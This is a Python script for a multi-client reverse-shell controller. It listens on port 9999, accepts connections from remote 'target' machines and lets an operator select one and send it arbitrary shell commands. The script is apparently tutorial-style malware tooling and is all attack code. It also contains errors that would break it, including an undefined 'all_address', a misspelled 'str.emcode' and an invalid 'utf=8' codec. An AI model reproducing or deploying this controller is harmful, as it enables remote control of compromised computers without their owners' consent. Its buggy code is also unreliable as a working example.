import socket
import threading
import sys
from queue import Queue

Number_of_threads=2
Thread_number=[1,2] #1 handles connections. 2 interacts with cmd
queue=Queue()
all_connections=[]
all_addresses=[]

#socket creation
def socket_create():
    try:
        global host
        global port
        global s
        host=''
        port=9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: '+str(msg))

#Binding socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print('Binding socket to port: '+str(port))
        s.bind((host,port))
        s.listen(5) #accept 5 connections
    except socket.error as msg:
        print('Socket binding failed '+str(msg)+ '\n'+'Retrying...')
        socket_bind() #recursion of def

#Accept connections from multiple clients
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]   #clear everything
    del all_addresses[:]
    while 1:
        try:
            conn, address=s.accept()
            conn.setblocking(1)  #
            all_connections.append(conn)
            all_addresses.append(address)
            print('\nConnection has been established '+address[0])
        except:
            print('Error accepting connections')


#Interactive prompt for sending commands
def start_command():
    while True:
        cmd=input('Command> ')
        if cmd=='list':
            list_connections()
        elif 'select' in cmd: ###############################################
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('None')



#Display all current connections
def list_connections():
    results=''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(10000)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results +=str(i) + ' '+str(all_addresses[i][0])+' '+str(all_addresses[i][1])+'\n'
    print('Clients:'+'\n'+results)


#Select a client
def get_target(cmd):
    try:
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to '+str(all_addresses[target][0]))
        print(str(all_address[target][0])+ '> ', end ="")
        return conn
    except:
        print('Not a valid selection ')
        return None

#Connect with remote target cient
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if len(str.emcode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(10000),"utf=8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print('Connection was lost')
            break
            
            

#Create threads
def create_threads():
    for _ in range(Number_of_threads):
        t=threading.Thread(target=work)
        t.daemon=True  #Kills the code
        t.start()

#Do the job in the queue
def work():
    while True:
        x=queue.get()
        if x==1:
            socket_create()
            socket_bind()
            accept_connections()
        if x==2:
            start_command()
        queue.task_done()

#Each list iten is a new job
def create_jobs():
    for x in Thread_number:
        queue.put(x)
    queue.join()


    
create_threads()
create_jobs()
































        
